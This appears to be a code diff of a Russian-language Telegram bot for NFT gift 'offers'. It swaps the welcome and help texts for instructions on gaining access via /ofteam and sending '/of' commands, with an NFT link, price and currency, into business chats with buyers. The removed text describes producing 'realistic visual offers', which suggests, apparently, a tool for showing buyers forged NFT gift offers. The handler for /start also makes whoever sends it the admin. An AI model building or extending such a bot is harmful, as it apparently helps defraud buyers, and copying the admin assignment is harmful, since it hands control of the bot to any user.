@@ -52,6 +52,22 @@ def get_pretty_name(slug):
     raw_name = slug.split('-')[0]
     return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
 
+# --- ТЕКСТ ИНСТРУКЦИИ (КАК ТЫ ПРОСИЛ) ---
+START_TEXT = (
+    "<b>Как начать:</b>\n"
+    "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
+    "<b>Как создать оффер:</b>\n\n"
+    "Отправь команду в деловой чат с покупателем:\n\n"
+    "<code>/of ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
+    "<b>Примеры:</b>\n"
+    "<code>/of t.me/nft/DurovsCap-1234 500 stars</code>\n"
+    "<code>/of t.me/nft/DurovsCap-1234 10 gram en</code>\n"
+    "<code>/of t.me/nft/DurovsCap-1234 250 stars ua</code>\n\n"
+    "<b>Валюты:</b> stars / gram\n"
+    "<b>Языки:</b> ru / en / ua / ar\n\n"
+    "Команду нужно отправлять через бизнес-аккаунт Telegram в чате с покупателем."
+)
+
 # --- ФУНКЦИЯ ДЛЯ ГЛАВНОГО МЕНЮ ---
 def get_main_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -67,26 +83,13 @@ async def cmd_start(message: types.Message):
     global ADMIN_ID
     ADMIN_ID = message.from_user.id 
     
-    text = (
-        "👋 <b>Добро пожаловать в NFT Offer Bot!</b>\n\n"
-        "Здесь вы можете создавать реалистичные визуальные офферы для NFT-подарков.\n\n"
-        "<i>Выберите нужный раздел в меню ниже:</i>"
-    )
-    await message.answer(text, reply_markup=get_main_menu(), parse_mode="HTML")
+    await message.answer(START_TEXT, reply_markup=get_main_menu(), parse_mode="HTML")
 
 # --- ОБРАБОТЧИКИ МЕНЮ ---
 @dp.callback_query(F.data == "menu_help")
 async def cb_menu_help(callback: types.CallbackQuery):
-    text = (
-        "<b>📖 Инструкция по созданию оффера:</b>\n\n"
-        "1. Подключите бота в «Автоматизацию чатов».\n"
-        "2. Отправьте команду в деловой чат:\n"
-        "<code>/of ССЫЛКА ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
-        "<b>Пример:</b>\n"
-        "<code>/of https://t.me/nft/DurovsCap-1234 500 stars ru</code>"
-    )
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_back")]])
-    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="HTML")
+    await callback.message.edit_text(START_TEXT, reply_markup=keyboard, parse_mode="HTML")
 
 @dp.callback_query(F.data == "menu_langs")
 async def cb_menu_langs(callback: types.CallbackQuery):
@@ -123,15 +126,10 @@ async def cb_menu_access(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data == "menu_back")
 async def cb_menu_back(callback: types.CallbackQuery):
-    text = (
-        "👋 <b>Добро пожаловать в NFT Offer Bot!</b>\n\n"
-        "Здесь вы можете создавать реалистичные визуальные офферы для NFT-подарков.\n\n"
-        "<i>Выберите нужный раздел в меню ниже:</i>"
-    )
-    await callback.message.edit_text(text, reply_markup=get_main_menu(), parse_mode="HTML")
+    await callback.message.edit_text(START_TEXT, reply_markup=get_main_menu(), parse_mode="HTML")
 
 
-# --- КОМАНДА /ofteam (ОСТАВЛЯЕМ ДЛЯ СОВМЕСТИМОСТИ) ---
+# --- КОМАНДА /ofteam ---
 @dp.message(Command("ofteam"))
 async def cmd_ofteam(message: types.Message):
     user_id = message.from_user.id
